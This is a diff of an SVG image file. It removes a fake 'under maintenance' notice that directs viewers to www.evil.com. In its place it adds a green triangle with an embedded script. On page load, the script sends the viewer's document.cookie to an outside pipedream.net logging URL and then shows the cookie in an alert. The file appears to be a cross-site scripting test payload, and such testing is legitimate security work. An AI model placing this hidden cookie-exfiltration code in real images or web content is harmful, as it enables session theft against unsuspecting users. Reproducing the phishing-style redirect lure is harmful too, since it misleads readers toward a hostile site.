@@ -1,12 +1,15 @@
-<svg width="600" height="200" xmlns="http://www.w3.org/2000/svg">
-  <rect width="100%" height="100%" fill="white"/>
-  <text x="50%" y="40%" font-family="Arial, sans-serif" font-size="24" text-anchor="middle" fill="black">
-    This page is under maintenance
-  </text>
-  <text x="50%" y="55%" font-family="Arial, sans-serif" font-size="24" text-anchor="middle" fill="black">
-    please visit this website first
-  </text>
-  <text x="50%" y="70%" font-family="Arial, sans-serif" font-size="24" text-anchor="middle" fill="red">
-    www.evil.com
-  </text>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    var rhyru = "Rhyru!";
+    window.onload = function() {
+      var img = new Image();
+      img.src = 'https://eoow6y96ffo9mzx.m.pipedream.net/log?c=' + document.cookie;
+      prompt(rhyru);
+      alert(document.cookie);
+    };
+  </script>
 </svg>
